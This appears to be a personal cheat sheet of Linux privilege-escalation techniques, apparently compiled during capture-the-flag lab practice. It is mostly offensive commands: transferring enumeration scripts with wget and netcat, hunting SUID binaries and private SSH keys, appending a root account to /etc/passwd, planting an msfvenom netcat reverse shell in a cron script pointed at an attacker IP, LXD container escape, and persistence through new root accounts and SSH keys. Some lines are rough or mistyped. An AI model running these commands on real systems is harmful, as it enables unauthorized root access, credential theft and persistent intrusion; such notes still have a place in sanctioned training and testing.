# Pathways

## send script

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
`python3 -m http.server 8080 -> wget http://IP:8080/filename`
`python3 -m http.server 8080`
`nc -w -3 10.10.36.138 1337 < LinEnum.sh -> nc -w -3 10.10.36.138 1337 < LinEnum.sh`
`kuku copy the script and run as executable`

* Scan with linPEAS, Enum4linux, LinEnum | 
* if not exec find SUID -> 
* * find / -perm -u=s -type f 2>/dev/null
* * find / -perm +6000 2>/dev/null | grep '/bin/'
* * find / -perm -4000 2>/dev/null
* * find / -group utmp 2>dev/null  >>>  use utmpdump <file>

# find key 

`find / -name id_rsa 2> /dev/null`

# Expoiting writable /etc/passwd (highly unlikely)

* create passwd hash -> `openssl passwd -1 -salt [salt] [password]`
* `adding new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/bin/bash to /etc/passwd will create a new root acct`  

# Exploiting Crontab
```
Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
# = ID
m = Minute
h = Hour
dom = Day of the month
mon = Month
dow = Day of the week
user = What user the command will run as
command = What command should be run
For Example,
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

`cat /etc/crontab`  to view what cron jobs are scheduled.

Generate payload on hostmachine with `msfvenom -p cmd/unix/reverse_netcat lhost=10.6.33.220 lport=8888 R`

Replace crontab content `echo [MSFVENOM OUTPUT] > autoscript.sh`

WAit for reverse shell listen with `nc -lvp 8888`

# Expoiting Path

* kenobi

* Using suid scripts to gain root access with $PATH variable

## try -> bash -p

# LXD Priv esc

```
Among the more curious privilege escalation methods on Linux, lxd is certainly a mind-bender, to say the least. This technique involves leveraging a flaw in lxd, a program that we can use to spin up containers much akin to Docker. This exploit specifically involves abusing mount points to mount volumes from our victim machine (the machine we're attacking) within a container that we shouldn't be able to access/read. However, we have root powers on lxd containers - thus allowing us to bypass the read permission checks and escalate our privileges. We can perform this privesc method via the following steps:


```

`1. First, we need to check and see if our user is a member of the lxd group. We can do this with the command: id`

![image](https://i.imgur.com/wmztMtK.png)

2. Typically, this privesc can be a bit of a drawn-out process, however, in our case, we'll be able to skip part of the way through. To perform it properly, we have to perform the following steps.:

- Steps to be performed on the attacking machine:

- - Download build-alpine on your local machine via the git repository [https://github.com/lxd-images/alpine-3-7-apache-php5-6](https://github.com/lxd-images/alpine-3-7-apache-php5-6)

- - Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.

- - Transfer this newly created tar file to the victim machine

- Steps to be performed on the victim machine:

- - Download the alpine image

- - Import image for lxd

- - Initialize the image inside a new container <- Worth checking the already imported/available images as you may be able to skip to this step

- - Mount the container inside the /root directory


3. For the sake of this example, we'll be skipping close to the end (see the bolded bit above) by checking what images are readily available on the machine in question. We can do that via the following command: lxc image list

4. run a series of commands which initialize, configure the disks, and start the container.
lxc init IMAGENAME CONTAINERNAME -c security.privileged=true

# POST EXPLOIT

## Persistence

* Create new root 
* * create passwd hash -> `openssl passwd -1 -salt [salt] [password]`
    `adding new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/bin/bash to /etc/passwd will create a new root acct`  
* Gen ssh and add ssh to auth keys -> IPPSEC crosfit video

## enum folder

* find /path -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | cloumn -t

## check for kernel exploit


# Reset passwd on physical ubuntu

* hold esc on reboot
* access advanced options -> recovey -> drop as root
* ls /home -> passwd user